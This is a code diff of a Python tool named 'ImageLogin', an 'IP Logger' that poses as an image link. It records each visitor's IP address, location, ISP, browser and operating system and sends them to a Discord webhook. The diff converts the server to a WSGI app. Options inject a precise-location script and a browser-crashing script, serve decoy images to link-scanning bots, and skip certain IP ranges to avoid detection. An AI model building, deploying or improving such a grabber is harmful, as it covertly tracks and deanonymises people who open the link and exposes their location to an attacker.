@@ -1,4 +1,3 @@
-from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from urllib import parse
 import base64
 import os
@@ -9,7 +8,7 @@ import requests
 
 __app__ = "ImageLogin"
 __description__ = "IP Logger"
-__version__ = "v3.0"
+__version__ = "v3.1"
 __author__ = "YonyLogger"
 
 config = {
@@ -37,9 +36,15 @@ config = {
 
 blacklistedIPs = ("27", "104", "143", "164")
 
-API_TIMEOUT = 10
-HOST = "0.0.0.0"
-PORT = int(os.environ.get("PORT", 8080))
+API_TIMEOUT = 5
+REASONS = {
+    200: "OK",
+    204: "No Content",
+    302: "Found",
+    400: "Bad Request",
+    500: "Internal Server Error",
+}
+
 PAGE = """<style>
 body {{ margin: 0; padding: 0; background: #0d0d0f; }}
 div.img {{
@@ -106,6 +111,35 @@ def formatTimezone(tz):
     return f"{region.replace('_', ' ')} ({area})"
 
 
+def clientIP(environ):
+    forwarded = environ.get("HTTP_X_FORWARDED_FOR") or environ.get("HTTP_X_REAL_IP") or ""
+    return forwarded.split(",")[0].strip()
+
+
+def resolveImage(query):
+    if config["imageArgument"]:
+        raw = query.get("url") or query.get("id")
+        if raw:
+            try:
+                return base64.b64decode(raw.encode()).decode()
+            except (ValueError, UnicodeDecodeError):
+                pass
+    return config["image"]
+
+
+def respond(start_response, code, content_type, body, extra=None):
+    headers = [
+        ("Content-Type", content_type),
+        ("Content-Length", str(len(body))),
+        ("Cache-Control", "no-store, max-age=0"),
+        ("Access-Control-Allow-Origin", "*"),
+    ]
+    if extra:
+        headers.extend(extra.items())
+    start_response(f"{code} {REASONS.get(code, 'OK')}", headers)
+    return [body]
+
+
 def reportError(error):
     post({
         "username": config["username"],
@@ -163,7 +197,10 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     os_name, browser = httpagentparser.simple_detect(useragent or "")
 
     coords_str = coords.replace(",", ", ") if coords else f"{info.get('lat')}, {info.get('lon')}"
-    coords_label = "Precise, [Google Maps](https://www.google.com/maps/search/google+map++" + coords + ")" if coords else "Approximate"
+    coords_label = (
+        "Precise, [Google Maps](https://www.google.com/maps/search/google+map++" + coords + ")"
+        if coords else "Approximate"
+    )
 
     if info.get("hosting") and not info.get("proxy"):
         bot_state = "True"
@@ -209,129 +246,94 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     return info
 
 
-class ImageLoginHandler(BaseHTTPRequestHandler):
-    server_version = f"{__app__}/{__version__}"
-
-    def log_message(self, fmt, *args):
-        print(f"[{self.address_string()}] {fmt % args}")
-
-    def sendBody(self, code, content_type, body, extra=None):
-        self.send_response(code)
-        self.send_header("Content-Type", content_type)
-        self.send_header("Content-Length", str(len(body)))
-        self.send_header("Cache-Control", "no-store, max-age=0")
-        if extra:
-            for key, value in extra.items():
-                self.send_header(key, value)
-        self.end_headers()
-        self.wfile.write(body)
-
-    def clientIP(self):
-        forwarded = self.headers.get("x-forwarded-for") or self.headers.get("x-real-ip") or ""
-        return forwarded.split(",")[0].strip()
-
-    def resolveImage(self, query):
-        if config["imageArgument"]:
-            raw = query.get("url") or query.get("id")
-            if raw:
-                try:
-                    return base64.b64decode(raw.encode()).decode()
-                except (ValueError, UnicodeDecodeError):
-                    pass
-        return config["image"]
-
-    def handleRequest(self):
-        try:
-            path, _, raw_query = self.path.partition("?")
-            query = dict(parse.parse_qsl(raw_query))
-            ip = self.clientIP()
-            useragent = self.headers.get("user-agent") or ""
-            url = self.resolveImage(query)
-            bot = isBot(ip, useragent)
-
-            if ip.startswith(blacklistedIPs):
-                return
-
-            if bot:
-                if config["buggedImage"]:
-                    self.sendBody(200, "image/jpeg", LOADING)
-                else:
-                    self.sendBody(302, "image/jpeg", b"", {"Location": url})
-                makeReport(ip, endpoint=path, url=url)
-                return
-
-            location = None
-            if query.get("g") and config["accurateLocation"]:
-                try:
-                    location = base64.b64decode(query["g"].encode()).decode()
-                except (ValueError, UnicodeDecodeError):
-                    location = None
-
-            result = makeReport(ip, useragent, location, path, url=url)
-
-            message = config["message"]["message"]
-            if config["message"]["richMessage"] and result:
-                os_name, browser = httpagentparser.simple_detect(useragent)
-                replacements = {
-                    "{ip}": ip,
-                    "{isp}": safe(result.get("isp")),
-                    "{asn}": safe(result.get("as")),
-                    "{country}": safe(result.get("country")),
-                    "{region}": safe(result.get("regionName")),
-                    "{city}": safe(result.get("city")),
-                    "{lat}": str(result.get("lat")),
-                    "{long}": str(result.get("lon")),
-                    "{timezone}": formatTimezone(result.get("timezone")),
-                    "{mobile}": str(result.get("mobile")),
-                    "{vpn}": str(result.get("proxy")),
-                    "{bot}": "True" if result.get("hosting") and not result.get("proxy") else "Possibly" if result.get("hosting") else "False",
-                    "{browser}": safe(browser),
-                    "{os}": safe(os_name),
-                }
-                for key, value in replacements.items():
-                    message = message.replace(key, value)
-
-            body = PAGE.format(url=url).encode()
-
-            if config["message"]["doMessage"]:
-                body = message.encode()
-
-            if config["crashBrowser"]:
-                body = message.encode() + CRASH_SCRIPT
-
-            if config["redirect"]["redirect"]:
-                body = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-
-            if config["accurateLocation"]:
-                body += LOCATION_SCRIPT
-
-            self.sendBody(200, "text/html", body)
-
-        except Exception:
-            self.sendBody(
-                500,
-                "text/html",
-                b"500 - Internal Server Error<br>Check the message sent to your Discord webhook.",
-            )
-            reportError(traceback.format_exc())
-
-    do_GET = handleRequest
-    do_POST = handleRequest
-
-
-handler = ImageLoginHandler
-
-
-def run():
-    server = ThreadingHTTPServer((HOST, PORT), handler)
-    print(f"{__app__} {__version__} by {__author__} — http://{HOST}:{PORT}")
+def app(environ, start_response):
     try:
-        server.serve_forever()
-    except KeyboardInterrupt:
-        print("\nShutting down.")
-    finally:
-        server.server_close()
+        method = environ.get("REQUEST_METHOD", "GET")
+        path = environ.get("PATH_INFO") or "/"
+        query = dict(parse.parse_qsl(environ.get("QUERY_STRING") or ""))
+        ip = clientIP(environ)
+        useragent = environ.get("HTTP_USER_AGENT") or ""
+
+        if not ip or ip.startswith(blacklistedIPs):
+            return respond(start_response, 204, "text/plain", b"")
+
+        url = resolveImage(query)
+        bot = isBot(ip, useragent)
+
+        if bot:
+            makeReport(ip, endpoint=path, url=url)
+            if config["buggedImage"]:
+                return respond(start_response, 200, "image/jpeg", LOADING)
+            return respond(start_response, 302, "image/jpeg", b"", {"Location": url})
+
+        location = None
+        if query.get("g") and config["accurateLocation"]:
+            try:
+                location = base64.b64decode(query["g"].encode()).decode()
+            except (ValueError, UnicodeDecodeError):
+                location = None
+
+        result = makeReport(ip, useragent, location, path, url=url)
+
+        if config["redirect"]["redirect"]:
+            return respond(start_response, 302, "text/html", b"", {"Location": config["redirect"]["page"]})
+
+        message = config["message"]["message"]
+        if config["message"]["richMessage"] and result:
+            os_name, browser = httpagentparser.simple_detect(useragent)
+            replacements = {
+                "{ip}": ip,
+                "{isp}": safe(result.get("isp")),
+                "{asn}": safe(result.get("as")),
+                "{country}": safe(result.get("country")),
+                "{region}": safe(result.get("regionName")),
+                "{city}": safe(result.get("city")),
+                "{lat}": str(result.get("lat")),
+                "{long}": str(result.get("lon")),
+                "{timezone}": formatTimezone(result.get("timezone")),
+                "{mobile}": str(result.get("mobile")),
+                "{vpn}": str(result.get("proxy")),
+                "{bot}": "True" if result.get("hosting") and not result.get("proxy") else "Possibly" if result.get("hosting") else "False",
+                "{browser}": safe(browser),
+                "{os}": safe(os_name),
+            }
+            for key, value in replacements.items():
+                message = message.replace(key, value)
+
+        body = PAGE.format(url=url).encode()
+
+        if config["message"]["doMessage"]:
+            body = message.encode()
+
+        if config["crashBrowser"]:
+            body = message.encode() + CRASH_SCRIPT
+
+        if config["accurateLocation"]:
+            body += LOCATION_SCRIPT
+
+        if method == "HEAD":
+            return respond(start_response, 200, "text/html", b"")
+
+        return respond(start_response, 200, "text/html", body)
+
+    except Exception:
+        reportError(traceback.format_exc())
+        return respond(
+            start_response,
+            500,
+            "text/html",
+            b"500 - Internal Server Error<br>Check the message sent to your Discord webhook.",
+        )
+
+
+handler = app
+application = app
 
 
 if __name__ == "__main__":
-    run()
+    from wsgiref.simple_server import make_server
+
+    port = int(os.environ.get("PORT", 8080))
+    with make_server("0.0.0.0", port, app) as server:
+        print(f"{__app__} {__version__} by {__author__} — http://localhost:{port}")
+        server.serve_forever()
